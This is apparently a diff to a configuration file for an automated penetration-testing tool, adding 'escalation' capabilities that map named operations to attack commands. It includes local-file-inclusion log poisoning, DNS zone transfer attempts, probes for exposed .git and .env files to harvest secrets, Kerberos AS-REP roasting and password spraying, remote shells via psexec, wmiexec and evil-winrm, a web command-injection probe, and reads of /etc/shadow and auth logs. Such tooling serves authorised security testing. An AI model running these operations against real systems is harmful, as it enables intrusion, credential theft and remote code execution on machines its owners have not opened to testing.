+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Access Log Read'
+args = ['{log-path}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Marker Confirm'
+args = ['-c', '{marker}', '{log-path}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Log Dir Inventory'
+args = ['-la', '/var/log/', '/var/log/apache2/', '/var/log/nginx/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Log Poison Confirm'
+args = ['-sk', '{url}/index.php?file=../../var/log/apache2/access.log']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'tail'
+[[capability.provider.operation]]
+name = 'Log Tail Check'
+args = ['-n', '20', '{log-path}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'SSH Log Marker Check'
+args = ['-l', '{marker}', '/var/log/auth.log', '/var/log/secure']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Log Read Perms'
+args = ['-la', '{log-path}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'UA Poison Inject'
+args = ['-sk', '-A', 'tsprobe-agent', 'http://127.0.0.1/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'PHP Session Scan'
+args = ['-rl', '{marker}', '/var/lib/php/sessions/', '/tmp/', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Readable Log Sweep'
+args = ['/var/log/', '-readable', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Auth Log Read'
+args = ['/var/log/auth.log']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.dns-zone-privilege'
+phase = 'escalation'
+label = 'DNS ZONE PRIVILEGE'
+summary = 'Probe DNS zone transfer and resolver config for escalation intel'
+inputs = [
+  { key = 'domain', type = 'domain', required = true },
+  { key = 'dns-server', type = 'target', required = false, default = '' },
+]
+[[capability.provider]]
+binary = 'dig'
+[[capability.provider.operation]]
+name = 'AXFR Attempt'
+args = ['{domain}', 'AXFR', '@{dns-server}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dig'
+[[capability.provider.operation]]
+name = 'NS Enumeration'
+args = ['{domain}', 'NS', '+short']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dig'
+[[capability.provider.operation]]
+name = 'SOA Pull'
+args = ['{domain}', 'SOA', '+short']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dig'
+[[capability.provider.operation]]
+name = 'Version Bind Query'
+args = ['@{dns-server}', 'version.bind', 'TXT', 'CHAOS']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dnsrecon'
+[[capability.provider.operation]]
+name = 'Zone Transfer Scan'
+args = ['-d', '{domain}', '-t', 'axfr']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dnsrecon'
+[[capability.provider.operation]]
+name = 'Standard Enum'
+args = ['-d', '{domain}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dnsenum'
+[[capability.provider.operation]]
+name = 'Zone Walk'
+args = ['{domain}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Resolv Conf Read'
+args = ['/etc/resolv.conf']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Named Conf Read'
+args = ['/etc/bind/named.conf']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'DNS Recursion Script'
+args = ['-sV', '-p', '53', '--script', 'dns-recursion', '{dns-server}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'host'
+[[capability.provider.operation]]
+name = 'Host Record Pull'
+args = ['-t', 'any', '{domain}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dig'
+[[capability.provider.operation]]
+name = 'Reverse Zone Probe'
+args = ['-x', '{dns-server}', '+short']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'escalation.git-repo-privilege'
+phase = 'escalation'
+label = 'GIT REPO PRIVILEGE'
+summary = 'Detect exposed git repos and harvest internal secrets'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Git HEAD Probe'
+args = ['-sk', '{url}/.git/HEAD']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Git Config Probe'
+args = ['-sk', '{url}/.git/config']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Git Index Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', '{url}/.git/index']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'SVN Entry Probe'
+args = ['-sk', '{url}/.svn/entries']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Env File Probe'
+args = ['-sk', '{url}/.env']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Backup File Probe'
+args = ['-sk', '{url}/backup.zip']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Git Exposure Templates'
+args = ['-u', '{url}', '-tags', 'exposure,git', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'gitleaks'
+[[capability.provider.operation]]
+name = 'Local Repo Secret Scan'
+args = ['detect', '--source', '.', '--report-format', 'json', '--report-path', '/tmp/gitleaks.json', '--no-git']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'trufflehog'
+[[capability.provider.operation]]
+name = 'Local Repo Scan'
+args = ['filesystem', '--directory=.', '--json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Composer JSON Probe'
+args = ['-sk', '{url}/composer.json']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Package JSON Probe'
+args = ['-sk', '{url}/package.json']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Debug Endpoint Probe'
+args = ['-sk', '{url}/debug', '{url}/actuator', '{url}/_profiler']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'escalation.kerberos-privilege'
+phase = 'escalation'
+label = 'KERBEROS PRIVILEGE'
+summary = 'Enumerate and abuse Kerberos misconfigurations'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'domain', type = 'domain', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+]
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Kerberos Port Probe'
+args = ['-sV', '-p', '88', '--script', 'krb5-enum-users', '--script-args', 'krb5-enum-users.realm={domain}', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-getUserSPNs'
+[[capability.provider.operation]]
+name = 'SPN Enumeration'
+args = ['{domain}/{username}:{password}@{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-GetNPUsers'
+[[capability.provider.operation]]
+name = 'ASREP Roast'
+args = ['{domain}/', '-usersfile', '/tmp/users.txt', '-no-pass', '-outputfile', '/tmp/asrep']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-getTGT'
+[[capability.provider.operation]]
+name = 'TGT Request'
+args = ['{domain}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-psexec'
+[[capability.provider.operation]]
+name = 'Kerberos Auth Shell'
+args = ['{rhost}', '-k', '-no-pass']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Kerberos Auth Test'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-k']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'User Enum Kerberos'
+args = ['kerberos', '{rhost}', '-u', '{username}', '-p', '{password}', '--users']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Password Spray'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-k']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'rpcclient'
+[[capability.provider.operation]]
+name = 'Domain SID Pull'
+args = ['{rhost}', '-U', '{username}%{password}', '-c', 'lookupnames', 'administrator']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Kpasswd Probe'
+args = ['-sV', '-p', '464', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-findDelegation'
+[[capability.provider.operation]]
+name = 'Delegation Enum'
+args = ['{domain}/{username}:{password}@{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-getArch'
+[[capability.provider.operation]]
+name = 'Architecture Enum'
+args = ['{rhost}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'escalation.privilege-audit'
+phase = 'escalation'
+label = 'PRIVILEGE AUDIT'
+summary = 'Consolidated local privilege escalation posture audit'
+inputs = [
+  { key = 'path', type = 'path', required = false, default = '/home' },
+]
+[[capability.provider]]
+binary = 'id'
+[[capability.provider.operation]]
+name = 'Identity Snapshot'
+args = []
+output = 'lines'
+network = false
+[[capability.provider]]
 binary = 'uname'
 [[capability.provider.operation]]
-name = 'Host Proof'
+name = 'Kernel Snapshot'
 args = ['-a']
 output = 'lines'
 network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'SUID Audit'
+args = ['/', '-perm', '-4000', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'getcap'
+[[capability.provider.operation]]
+name = 'Capability Audit'
+args = ['-r', '/', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sudo'
+[[capability.provider.operation]]
+name = 'Sudo Audit'
+args = ['-l']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'crontab'
+[[capability.provider.operation]]
+name = 'Cron Audit'
+args = ['-l']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Timer Audit'
+args = ['list-timers', '--all', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Writable Path Audit'
+args = ['/', '-maxdepth', '3', '-writable', '-type', 'd', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'getent'
+[[capability.provider.operation]]
+name = 'Group Audit'
+args = ['group']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Shadow Readability'
+args = ['-c', '.', '/etc/shadow']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Docker Socket Audit'
+args = ['-la', '/var/run/docker.sock']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'capsh'
+[[capability.provider.operation]]
+name = 'Capability Snapshot'
+args = ['--print']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'escalation.remote-code-exec'
+phase = 'escalation'
+label = 'REMOTE CODE EXEC'
+summary = 'Convert foothold-level access into remote command execution probes'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+  { key = 'url', type = 'url', required = false, default = '' },
+]
+[[capability.provider]]
+binary = 'impacket-psexec'
+[[capability.provider.operation]]
+name = 'SMB Exec Shell'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'WMI Exec Shell'
+args = ['{rhost}/{username}:{password}', 'whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-atexec'
+[[capability.provider.operation]]
+name = 'Task Scheduler Exec'
+args = ['{rhost}/{username}:{password}', 'whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-dcomexec'
+[[capability.provider.operation]]
+name = 'DCOM Exec Probe'
+args = ['{rhost}/{username}:{password}', 'whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-smbexec'
+[[capability.provider.operation]]
+name = 'SMB Exec Alt'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'evil-winrm'
+[[capability.provider.operation]]
+name = 'WinRM Shell'
+args = ['-i', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'SMB Command Test'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'SSH Command Exec'
+args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Web RCE Probe'
+args = ['-sk', '{url}', '-d', 'cmd=id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'RCE Template Sweep'
+args = ['-u', '{url}', '-tags', 'rce', '-severity', 'critical,high', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'WinRM Command Test'
+args = ['winrm', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat Exec Test'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'hostname']
+output = 'lines'
+network = true
 
 # --------------------------------------------------------------------------
 # CREDENTIALS
